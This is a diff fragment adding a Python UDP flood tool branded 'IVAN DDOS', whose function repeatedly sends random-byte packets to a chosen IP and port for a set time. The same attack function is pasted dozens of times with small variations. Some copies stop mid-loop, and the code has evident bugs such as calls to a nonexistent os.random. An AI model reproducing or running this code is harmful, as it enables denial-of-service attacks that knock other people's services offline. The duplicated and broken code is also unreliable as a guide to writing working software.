+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
